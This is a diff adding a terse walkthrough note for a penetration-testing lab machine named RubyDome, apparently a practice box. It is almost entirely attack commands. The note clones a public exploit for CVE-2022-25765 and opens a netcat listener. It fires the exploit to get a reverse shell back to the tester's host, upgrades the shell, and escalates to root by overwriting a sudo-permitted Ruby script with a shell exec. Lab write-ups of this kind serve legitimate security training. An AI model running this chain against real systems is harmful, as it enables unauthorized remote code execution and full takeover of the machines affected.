@@ -1,0 +1,22 @@
+RubyDome
+
+192.168.245.22
+
+http://192.168.245.22:3000/
+https://github.com/UNICORDev/exploit-CVE-2022-25765
+git clone https://github.com/UNICORDev/exploit-CVE-2022-25765.git
+cd exploit-CVE-2022-25765
+pip3 install -r requirements.txt
+
+nc -nvlp 1234
+python3 exploit-CVE-2022-25765.py -s 192.168.45.173 1234 -w http://192.168.245.22:3000/pdf -p url     
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+sudo -l
+(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
+
+echo 'exec "/bin/sh"'>/home/andrew/app/app.rb
+
+sudo /usr/bin/ruby /home/andrew/app/app.rb
+
+got root
